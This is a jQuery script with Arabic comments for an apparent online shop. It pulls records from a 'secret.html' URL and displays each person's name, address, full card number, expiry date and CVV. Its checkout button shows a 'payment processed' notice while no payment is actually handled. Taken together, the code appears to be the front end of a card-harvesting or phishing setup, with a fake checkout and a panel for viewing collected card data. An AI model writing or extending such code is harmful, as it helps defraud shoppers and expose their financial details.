$(document).ready(function() {
    $.ajax({
        url: 'https://electronic-marketing.vercel.app/secret.html',  // تأكد من أن هذا العنوان صحيح
        method: 'GET',
        success: function(data) {
            if (data.length > 0) {
                let detailsHtml = '<ul>';
                data.forEach(item => {
                    detailsHtml += `
                        <li>
                            <strong>الاسم:</strong> ${item.name}<br>
                            <strong>الشارع:</strong> ${item.streetName}<br>
                            <strong>المنطقة:</strong> ${item.province}<br>
                            <strong>رقم البطاقة:</strong> ${item.cardNumber}<br>
                            <strong>تاريخ انتهاء الصلاحية:</strong> ${item.expiryDate}<br>
                            <strong>CVV:</strong> ${item.cvv}<br>
                        </li><hr>
                    `;
                });
                detailsHtml += '</ul>';
                $('#card-details').html(detailsHtml);
            } else {
                $('#card-details').html('<p>لا توجد بيانات مسجلة.</p>');
            }
        },
        error: function(xhr, status, error) {
            console.error('Error fetching data:', status, error);
            $('#card-details').html('<p>حدث خطأ أثناء جلب البيانات.</p>');
        }
    });

    // معالجة أنواع البطاقات
    $('#cardNumber').on('input', function() {
        const cardNumber = $(this).val().replace(/\s/g, '');
        let cardType = '';
        let maxLength = 16;
        let cvvLength = 3;

        // تعرف على نوع البطاقة
        if (/^4/.test(cardNumber)) {
            cardType = 'Visa';
            $('#cardImage').attr('src', 'visa.png');
        } else if (/^5[1-5]/.test(cardNumber)) {
            cardType = 'MasterCard';
            $('#cardImage').attr('src', 'mastercard.png');
        } else if (/^3[47]/.test(cardNumber)) {
            cardType = 'American Express';
            $('#cardImage').attr('src', 'amex.png');
            maxLength = 15;
            cvvLength = 4;
        } else if (/^6/.test(cardNumber)) {
            cardType = 'Discover';
            $('#cardImage').attr('src', 'discover.png');
        } else if (/^35/.test(cardNumber)) {
            cardType = 'JCB';
            $('#cardImage').attr('src', 'jcb.png');
        } else {
            $('#cardImage').attr('src', '');
        }

        // ضبط خصائص الحقل بناءً على نوع البطاقة
        if (cardType) {
            $('#cardImage').show();
            $(this).attr('maxlength', maxLength);
            $('#cvv').attr('maxlength', cvvLength);
        } else {
            $('#cardImage').hide();
        }
    });

    // معالجة تنسيق تاريخ الانتهاء
    $('#expiryDate').on('input', function() {
        let value = $(this).val().replace(/[^0-9]/g, '');
        if (value.length > 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        $(this).val(value);
    });

    // التأكد من أن الزر يبقى مرئيًا عند التمرير
    $(window).scroll(function() {
        if ($(this).scrollTop() > 50) {
            $('.cart-button').addClass('scrolled');
        } else {
            $('.cart-button').removeClass('scrolled');
        }
    });

    // التعامل مع زر عربة التسوق
    $('.cart-button').click(function() {
        // عرض إشعار مع الرسالة "تمت معالجة الدفع"
        $('#notification').fadeIn().delay(3000).fadeOut();
    });
});

